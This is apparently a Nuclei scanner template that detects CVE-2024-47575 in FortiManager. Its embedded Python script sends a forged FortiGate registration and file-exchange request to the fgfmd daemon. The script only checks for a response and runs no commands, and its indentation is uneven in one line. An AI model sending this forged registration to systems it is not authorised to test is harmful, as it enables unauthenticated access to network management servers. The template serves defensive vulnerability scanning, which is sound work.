id: CVE-2024-47575

info:
  name: FortiManager Unauthenticated Remote Code Execution
  author: pussycat0x,0x_Akoko,watchTowr
  severity: critical
  description: |
    A missing authentication vulnerability in Fortinet FortiManager allows a remote unauthenticated attacker to execute arbitrary code or commands via specially crafted requests to the fgfmd daemon. This vulnerability affects FortiManager versions 7.6.0, 7.4.0 through 7.4.4, 7.2.0 through 7.2.7, 7.0.0 through 7.0.12, 6.4.0 through 6.4.14, 6.2.0 through 6.2.12, and all versions of 6.0.
  remediation: |
    Update FortiManager to version 7.6.1 or later, 7.4.5 or later, 7.2.8 or later, 7.0.13 or later, or 6.4.15 or later.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-47575
    - https://github.com/watchtowrlabs/Fortijump-Exploit-CVE-2024-47575
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-47575
    cwe-id: CWE-306
    epss-score: 0.97824
    epss-percentile: 0.99876
    cpe: cpe:2.3:a:fortinet:fortimanager:*:*:*:*:*:*:*
  metadata:
    verified: true
  tags: cve,cve2024,fortinet,fortimanager,rce,passive

variables:
  HOST: "{{Host}}"
  PORT: "{{Port}}"

code:
  - engine:
      - py
      - python3
    source: |
      import socket
      import struct
      import ssl
      import logging
      import os
      import sys

      logging.basicConfig(level=logging.INFO, format='%(message)s')

      FW_VERSION = None

      def create_ssl_context():
          context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
          context.check_hostname = False
          context.verify_mode = ssl.CERT_NONE
          return context

      def send_message(sock, request):
          message = struct.pack(">II", 0x36e01100, len(request) + 8) + request
          sock.send(message)

          hdr = sock.read(8)
          if len(hdr) != 8:
              return None

          magic, size = struct.unpack(">II", hdr)
          return sock.read(size - 8)

      def check_vulnerability(target_ip, target_port, timeout=10):
          global FW_VERSION

          auth_request = b"""get auth
        serialno=FGVMEVWG8YMT3R63
        mgmtid=00000000-0000-0000-0000-000000000000
        platform=FortiGate-60E
        fos_ver=700
        minor=2
        patch=4
        build=1396
        branch=1396
        maxvdom=2
        fg_ip=192.168.1.53
        hostname=FortiGate
        harddisk=yes
        biover=04000002
        harddisk_size=30720
        logdisk_size=30107
        mgmt_mode=normal
        enc_flags=0
        mgmtip=192.168.1.53
        mgmtport=443
        \0""".replace(b"\n", b"\r\n")

                  file_exchange_request = b"""get file_exchange
        localid=123
        chan_window_sz=32768
        deflate=gzip
        file_exch_cmd=put_json_cmd

        \0""".replace(b"\n", b"\r\n")

          try:
              context = create_ssl_context()
              sock = socket.create_connection((target_ip, target_port), timeout=timeout)
              ssl_sock = context.wrap_socket(sock)

              response = send_message(ssl_sock, auth_request)
              if not response:
                  return False, None

              response = send_message(ssl_sock, file_exchange_request)
              if not response:
                  return False, None

              try:
                  response_str = response.decode('utf-8', errors='ignore')
                  for line in response_str.split('\r\n'):
                      if 'remoteid=' in line:
                          remote_id = line.split('=')[1].strip()
                          if remote_id:
                              ssl_sock.close()
                              return True, FW_VERSION
              except Exception:
                  pass

              ssl_sock.close()
              return False, FW_VERSION

          except socket.timeout:
              logging.error(f"[-] {target_ip}:{target_port} - Connection timeout")
              return False, None
          except ConnectionRefusedError:
              logging.error(f"[-] {target_ip}:{target_port} - Connection refused")
              return False, None
          except Exception as e:
              logging.error(f"[-] {target_ip}:{target_port} - Error: {e}")
              return False, None

      def main():
          host = os.getenv("HOST")
          port = os.getenv("PORT")

          if not host:
              logging.error("[-] HOST environment variable not set")
              return

          target_port = int(port) if port else 541

          try:
              is_vulnerable, fw_version = check_vulnerability(host, target_port)

              if is_vulnerable:
                  if fw_version:
                      print(f"Vulnerable Version {fw_version}")
                  else:
                      print("Vulnerable")
              else:
                  if fw_version:
                      print(f"NOT VULN Version {fw_version}")
                  else:
                      print("NOT VULN")

          except Exception as e:
              logging.error(f"[-] {host}:{target_port} - Error: {e}")

      if __name__ == "__main__":
          main()

    matchers:
      - type: word
        words:
          - "Vulnerable"

    extractors:
      - type: dsl
        dsl:
          - response
# digest: 4a0a004730450220461d3c9682e8f7a0669eab175ce16bce2f2ec55a5feb3844d4cfcd4eccd52db2022100c013230ac165cfe1f19e30a0fb1c45ba7a2f5361bac6560bff519e2815e7cc7f:bd4199f08311fe94da3c6b619521b96e
